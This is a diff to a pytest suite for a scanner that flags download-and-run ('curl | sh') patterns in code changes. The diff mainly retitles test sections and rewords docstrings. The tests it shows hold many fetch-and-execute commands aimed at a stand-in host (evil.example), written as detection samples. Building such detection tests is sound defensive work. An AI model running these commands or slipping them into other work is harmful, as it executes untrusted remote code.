@@ -1890,7 +1890,7 @@ def test_punctuation_after_a_tool_name_ends_the_clause(word, tail):
     assert _rules(scan_change({**BENIGN_EVENT, "body": body}))["curl-pipe-shell"] == "medium", body
 
 
-# ── round 15 ──────────────────────────────────────────────────────────────────────────────────────────
+# ── a glued download word, quoted strings in the command, a path as the program, rcfiles, placeholders ──
 
 @pytest.mark.parametrize("glue", ["curl.", "curl;", "curl(", "curl:", "wget:", "iwr.", "Invoke-RestMethod."])
 def test_a_long_run_of_download_words_glued_together_is_linear(glue):
@@ -1996,7 +1996,7 @@ def test_a_placeholder_beside_a_real_target_still_has_a_target(cmd):
     assert _rules(scan_change({**BENIGN_EVENT, "body": cmd}))["curl-pipe-shell"] == "critical", cmd
 
 
-# ── round 16 ──────────────────────────────────────────────────────────────────────────────────────────
+# ── pipes and hashes, folded long tokens, split and obfuscated download words, stand-ins, code spans ──
 
 @pytest.mark.parametrize("unit", ["|#", "| #", "|\t#"])
 def test_a_line_of_pipes_and_hashes_with_no_final_newline_is_linear(unit):
@@ -2129,7 +2129,7 @@ def test_many_commands_on_one_long_line_cost_a_bounded_amount_each(unit):
         _timed(event, budget=3.0)
 
 
-# ── round 17 ──────────────────────────────────────────────────────────────────────────────────────────
+# ── cost per character of a long line, backticks inside quotes, repeated groups, a table cell's `\|` ──
 
 def _cpu_per_char(text, *, prose=True):
     import time
@@ -2285,7 +2285,7 @@ def test_the_html_and_thresholds_that_decide_how_much_is_read():
     assert _rules(scan_change({**BENIGN_EVENT, "body": far}))["curl-pipe-shell"] == "medium"        # read up to a limit
 
 
-# ── round 18 ──────────────────────────────────────────────────────────────────────────────────────────
+# ── a shell path inside a long word, option clusters, two platforms on one line, process substitution ──
 
 @pytest.mark.parametrize("mid", ["|/bin/sh;#", "|/bin/bash&&", '|"/bin/sh";', "|/bin/zsh;", "|/usr/local/bin/bash;", "|sh;#", "|$SHELL;"])
 def test_a_shell_path_inside_a_long_word_survives_the_fold(mid):
@@ -2332,7 +2332,7 @@ def test_an_interpreter_reading_a_download_by_process_substitution(cmd):
     assert _rules(scan_change({**BENIGN_EVENT, "files": [_doc_patch("install.sh", cmd)]}))["curl-pipe-shell"] == "critical", cmd
 
 
-# ── round 19 ──────────────────────────────────────────────────────────────────────────────────────────
+# ── the cut of the head, the next span on a line, `-s` after a script, the first pipe into a shell ────
 
 @pytest.mark.parametrize("offset", [0, 20, 55, 60, 70, 73, 76, 78, 79, 80, 90])
 @pytest.mark.parametrize("mid", ["|/bin/sh;#", "|sh;#", "|bash&&", "|$SHELL;"])
@@ -2414,7 +2414,7 @@ def test_the_first_pipe_into_a_shell_is_the_sink_and_two_commands_are_two_matche
     assert indicators._CURL_PIPE_RE.search(three).group("stages").count("|") == 2
 
 
-# ── round 20 ──────────────────────────────────────────────────────────────────────────────────────────
+# ── padded shell paths, what the folds do, the outer command around a span, PowerShell `-Command` ─────
 
 @pytest.mark.parametrize("cmd", [
     "curl -fsSL https://evil.example/x|/bin" + "/" * 58 + "sh", "curl -fsSL https://evil.example/x|" + "/.." * 19 + "/bin/sh",
@@ -2497,7 +2497,7 @@ def test_the_leading_flags_that_may_hold_dash_s_go_six_deep_or_more():
     assert _rules(scan_change({**BENIGN_EVENT, "body": late}))["curl-pipe-shell"] == "critical"
 
 
-# ── round 21 ──────────────────────────────────────────────────────────────────────────────────────────
+# ── a documented span inside an outer command, a quote inside the shell's path, backtick substitutions ──
 
 @pytest.mark.parametrize("cmd", [
     "curl a `curl https://get.docker.com | sh` https://evil.example/x | sh",
@@ -2546,7 +2546,7 @@ def test_the_anchor_needs_a_backtick_and_the_same_end():
         "curl-pipe-shell"] == "critical"                       # no span: the sentence's word is part of the command
 
 
-# ── round 22 ──────────────────────────────────────────────────────────────────────────────────────────
+# ── the cost of re-anchoring, closing backticks, the per-form hit cap, what follows a span ────────────
 
 def test_re_anchoring_costs_a_bounded_amount_per_download_word():
     """A pipe match can be huge (a quoted string counts as one item of the window); the look-back for a span opener
@@ -2614,7 +2614,7 @@ def test_emphasis_closed_after_the_punctuation_is_still_a_prose_lead(cmd):
     assert _rules(scan_change({**BENIGN_EVENT, "body": cmd}))["curl-pipe-shell"] == "medium", cmd
 
 
-# ── round 23 (found through the shell oracle) ────────────────────────────────────────────────────────
+# ── markup glued to a wrapper, a script or a word between the shell and the download ──────────────────
 
 @pytest.mark.parametrize("wrapper", ["<code>", "<pre>", "<kbd>", "<b>", "<p>", "<td>", "<!-- x -->", "__", "~~", "_"])
 def test_markup_glued_to_a_wrapper_does_not_hide_it(wrapper):
@@ -2655,7 +2655,7 @@ def test_a_script_or_a_command_word_between_the_shell_and_the_download_means_the
     'bash -c "$(/usr/bin/env A=b curl -fsSL https://evil.example/x)"', 'bash -c "$(stdbuf -o0 curl -fsSL https://evil.example/x)"',
     'bash -c "$(doas curl -fsSL https://evil.example/x)"',
 ])
-def test_recall_misses_the_oracle_found(cmd):
+def test_a_shell_variable_a_quoted_interpreter_or_a_wrapper_in_a_substitution_still_runs_the_download(cmd):
     assert _rules(scan_change({**BENIGN_EVENT, "files": [_doc_patch("install.sh", cmd)]}))["curl-pipe-shell"] == "critical", cmd
 
 
@@ -2681,7 +2681,7 @@ def test_a_numeric_flag_value_is_not_a_host():
     assert fetch_targets("curl --retry 16909060 https://sh.rustup.rs") == [("sh.rustup.rs", "")]
 
 
-# ── round 24 (found through the shell oracle) ────────────────────────────────────────────────────────
+# ── a quoted or backslashed program, a semicolon in the lead, an integer host ─────────────────────────
 
 _DL = "curl -fsSL https://evil.example/x"
 
@@ -2692,7 +2692,8 @@ _DL = "curl -fsSL https://evil.example/x"
     f"'source' <({_DL})", f'\\. <({_DL})',
 ])
 def test_a_quoted_or_backslashed_program_before_a_substitution_is_still_a_download_that_runs(cmd):
-    """The shell reads `\\eval` and `"."` as `eval` and `.`; only the shell's own name used to carry its quotes."""
+    """The shell reads `\\eval` and `"."` as `eval` and `.`, so a quoted or backslashed program is that program, as a quoted
+    shell name is that shell."""
     assert _rules(scan_change({**BENIGN_EVENT, "files": [_doc_patch("install.sh", cmd)]}))["curl-pipe-shell"] == "critical", cmd
 
 
@@ -2743,7 +2744,7 @@ def test_a_real_program_around_a_backtick_substitution_is_judged_by_the_substitu
         assert _rules(scan_change({**BENIGN_EVENT, "body": prose}))["curl-pipe-shell"] == "medium", prose
 
 
-# ── round 25 (found through the shell oracle) ────────────────────────────────────────────────────────
+# ── closing markup after a script operand, typographic quotes and brackets ────────────────────────────
 
 _RUSTUP = "curl -fsSL https://sh.rustup.rs"
 
@@ -2783,7 +2784,7 @@ def test_a_blank_between_the_quote_and_the_opener_is_still_a_download_that_runs(
     assert _rules(scan_change({**BENIGN_EVENT, "files": [_doc_patch("install.sh", cmd)]}))["curl-pipe-shell"] == "critical", cmd
 
 
-# ── round 26 (found through the shell oracle, now also in prose) ─────────────────────────────────────────
+# ── emphasis and CJK prose, interpreter sinks, a quote or heredoc open above, the rendered view ───────
 
 _EVIL_URL = "curl https://evil.example/x"
 
@@ -2830,7 +2831,7 @@ def test_a_label_or_a_redirect_glued_to_a_wrapper_does_not_hide_it(lead):
     f"<docker run evil {_RUSTUP} | sh", f"docker >=3.9 {_RUSTUP} | sh", f"See http://example.com and run {_RUSTUP} | sh",
     f"Install uv (macOS): {_RUSTUP} | sh", f"Requires ssh://host. Run {_RUSTUP} | sh",
 ])
-def test_a_bracket_a_version_or_a_url_before_the_command_is_still_prose_or_a_wrapper_as_before(text):
+def test_a_bracket_a_version_or_a_url_before_the_command_reads_as_prose_or_a_wrapper(text):
     got = _rules(scan_change({**BENIGN_EVENT, "body": text}))["curl-pipe-shell"]
     assert got == ("critical" if text.startswith("<docker") else "medium"), (text, got)       # `>=3.9` is a version, not an argument
 
@@ -2897,7 +2898,7 @@ def test_a_documented_installer_in_markup_is_reported_once_not_twice(text):
     assert [h.severity for h in hits] in (["medium"], ["critical"]) and len(hits) == 1, (text, [h.severity for h in hits])
 
 
-# ── round 27 (found through the shell oracle: the rendered view, breadcrumbs, labels, long heredocs) ────────
+# ── the rendered view, breadcrumbs, labels, long heredocs ─────────────────────────────────────────────
 
 @pytest.mark.parametrize("text", [
     f"do<b></b>cker run x {_RUSTUP} | sh", f"doc<!-- -->ker run x {_RUSTUP} | sh", f"ss<b></b>h evil.example {_RUSTUP} | sh",
@@ -3008,7 +3009,7 @@ def test_an_html_file_is_documentation_too():
     assert _rules(scan_change({**BENIGN_EVENT, "files": [_doc_patch("docs/index.html", spans)]}))["curl-pipe-shell"] == "critical"
 
 
-# ── round 28 (closure review, found through the shell oracle) ──────────────────────────────────────────
+# ── long tag attributes, link titles, autolinks, markers glued to a wrapper ───────────────────────────
 
 _DOCKER = "curl -fsSL https://get.docker.com"
 
@@ -3072,7 +3073,7 @@ def test_a_one_letter_list_marker_is_not_a_file_name_before_a_substitution_form(
     assert "curl-pipe-shell" not in _rules(scan_change({**BENIGN_EVENT, "body": f"evil.sh <({_EVIL_URL})"}))
 
 
-# ── round 29 (closure review, found through the shell oracle) ──────────────────────────────────────────
+# ── breadcrumbs before a program, block tags, a tool's name in its own element, link destinations ─────
 
 @pytest.mark.parametrize("program", ["~/evil", "/opt/evil", "./evil", "docker>f run x", "scripts/evil.sh", "ssh>f evil.example"])
 def test_a_program_after_four_or_more_breadcrumbs_is_the_command_not_a_redirect_target(program):
@@ -3129,7 +3130,7 @@ def test_more_marker_shapes_glued_to_a_wrapper_do_not_hide_it(lead):
     assert _rules(scan_change({**BENIGN_EVENT, "body": text}))["curl-pipe-shell"] == "critical", text
 
 
-# ── round 30 (closure review: two false positives on documented installers) ────────────────────────────
+# ── a tool's name before a block tag, the cells of a table row in front of a documented installer ─────
 
 @pytest.mark.parametrize("tool", ["uv", "docker", "bun", "deno", "poetry", "node", "python", "ssh"])
 @pytest.mark.parametrize("shape", [
@@ -3164,7 +3165,7 @@ def test_a_decoded_entity_is_still_a_command_separator_when_it_is_one():
     assert _rules(scan_change({**BENIGN_EVENT, "body": f"<b>x</b> &amp;&amp; {_DOCKER} | sh"}))["curl-pipe-shell"] == "critical"
 
 
-# ── round 31 (closure review: a table with more than one row, and a footnote marker glued to a link) ────────
+# ── a table with more than one row, and a footnote marker glued to a link ─────────────────────────────
 
 _UV = "curl -LsSf https://astral.sh/uv/install.sh"
 _PIPE = "\\|"                                  # a pipe inside a Markdown table cell is written `\|`
@@ -3203,7 +3204,7 @@ def test_a_footnote_marker_glued_to_a_link_is_a_marker_and_a_link_not_one_refere
         assert _rules(scan_change(event))["curl-pipe-shell"] == "critical", text
 
 
-# ── round 32 (closure review: the table-row rule belongs to the softening, and a one-column table) ──────────
+# ── the table-row rule in the softening, and a one-column table ───────────────────────────────────────
 
 @pytest.mark.parametrize("text", [
     "curl -H 'X: a\n| b' https://evil.example/x |\nsh", ">|/tmp/o : ; curl https://evil.example/x |\nsh",
@@ -3226,7 +3227,7 @@ def test_a_one_column_markdown_table_row_is_not_a_command_prefix(cell, command):
     assert _rules(scan_change({**BENIGN_EVENT, "body": f"| {cell.format(c=_EVIL_URL + ' ' + _PIPE + ' sh')} |"}))["curl-pipe-shell"] == "critical"
 
 
-# ── round 33 (closure review: the scan and the softening read the text differently around table rows) ──────
+# ── where the scan and the softening read table rows differently ──────────────────────────────────────
 
 _HB = "https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh"
 
@@ -3263,7 +3264,7 @@ def test_a_table_of_several_rows_holding_a_documented_substitution_form_is_mediu
             assert _rules(scan_change(event))["curl-pipe-shell"] == "medium", table
 
 
-# ── round 34 (closure review: the same number of matches, but not the same matches) ─────────────────────
+# ── the same number of matches is not the same matches ────────────────────────────────────────────────
 
 @pytest.mark.parametrize("text", [
     f">|/tmp/o : ; {_EVIL_URL} | tee >(sh) |\n{_DOCKER} | sh", f"echo 'a\n| b' ; {_EVIL_URL} | tee >(sh) |\n{_DOCKER} | sh",
@@ -3303,7 +3304,7 @@ def test_a_blockquoted_pipeline_is_joined_across_its_quote_markers(text):
 
 
 
-# ── round 35 (closure review of the single-reading design) ────────────────────────────────────────────────
+# ── a table-row-looking line inside an open quote, one-column rows ────────────────────────────────────
 
 @pytest.mark.parametrize("payload", [
     "echo 'a\n| b | c' ; curl https://evil.example/x |\nsh", "curl -H 'X: a\n| b | c' https://evil.example/x |\nsh",
@@ -3334,7 +3335,7 @@ def test_a_one_column_row_holding_the_command_and_followed_by_a_paragraph_is_cri
     assert _rules(scan_change({**BENIGN_EVENT, "body": two}))["curl-pipe-shell"] == "medium"
 
 
-# ── round 36 (the quotes of a table-row-looking line prove nothing by their number) ─────────────────────────
+# ── the quotes of a table-row-looking line prove nothing by their number ──────────────────────────────
 
 _EV = "curl https://evil.example/x"
 
@@ -4357,7 +4358,7 @@ def test_a_path_that_begins_with_several_slashes_is_a_program(lead, path):
 
 @pytest.mark.parametrize("word", ["//", "/", "/>", "/ "])
 def test_a_lone_slash_in_front_of_the_download_is_a_program_to_the_floor_and_none_to_the_lead_check(word):
-    """The lead check of the softening takes no lone slash for a program; the earlier rule, which the floor asks of the same text, takes any word with a slash for one."""
+    """The lead check of the softening takes no lone slash for a program; the line-wide rule, which the floor asks of the same text, takes any word with a slash for one."""
     from diff_sentry.indicators import _wrapped
     from diff_sentry.linewide import wrapped
     assert not _wrapped(f"sudo {word} ") and wrapped(f"sudo {word} ")
@@ -4690,8 +4691,8 @@ def test_an_extglob_group_is_decided_when_its_closing_paren_is_within_two_hundre
 
 
 def test_a_download_with_words_of_eighty_to_a_hundred_and_twenty_characters_between_curl_and_the_pipe_is_still_found():
-    """`_fold_padding` folds a blank-free word of more than 120 characters; one of 81 to 120 stays (a second regex of the same name once folded those too, and the 300 characters
-    between `curl` and the pipe no longer reached it)."""
+    """`_fold_padding` folds a blank-free word of more than 120 characters; one of 81 to 120 stays, and the window of 300
+    characters between `curl` and the pipe still reaches the pipe past two of them."""
     text = f"curl -sS --data-urlencode k0={'a' * 80} --data-urlencode k1={'b' * 80} https://evil.example/x | sh"
     assert _curl_pipe_shell(text) == "critical"
     assert _curl_pipe_shell("<pre><code>/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"</code></pre>") == "medium"
